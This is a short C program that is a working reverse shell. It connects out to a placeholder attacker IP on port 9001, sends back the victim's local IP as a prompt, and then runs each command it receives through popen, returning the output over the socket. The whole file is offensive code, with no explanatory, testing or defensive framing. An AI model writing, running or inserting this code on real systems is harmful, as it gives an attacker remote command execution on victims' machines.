#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

int main(void){
    int port = 9001;
    struct sockaddr_in revsockaddr;
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("<attacker-ip>");
    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));

    // Get and print local IP
    struct sockaddr_in local_addr;
    socklen_t addr_len = sizeof(local_addr);
    getsockname(sockt, (struct sockaddr*)&local_addr, &addr_len);
    char ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &local_addr.sin_addr, ip_str, INET_ADDRSTRLEN);
    char greeting[200];
    snprintf(greeting, sizeof(greeting), "%s> ", ip_str);
    write(sockt, greeting, strlen(greeting));

    char buffer[1024];
    char prompt[50];
    prompt[0]='\0';
    strcat(prompt,ip_str);
    strcat(prompt,"> ");

    while(1) {
        int len = read(sockt, buffer, sizeof(buffer) - 1);
        if (len <= 0) break;
        buffer[len] = '\0';
        buffer[strcspn(buffer, "\n\r")] = 0;

        if (strcmp(buffer, "exit") == 0) break;

        FILE *fp = popen(buffer, "r");
        if (fp) {
            while (fgets(buffer, sizeof(buffer), fp)) {
                write(sockt, buffer, strlen(buffer));
            }
            pclose(fp);
        } else {
            write(sockt, "Error\n", 6);
        }
        write(sockt, prompt, strlen(prompt));
    }

    close(sockt);
    return 0;       
}   
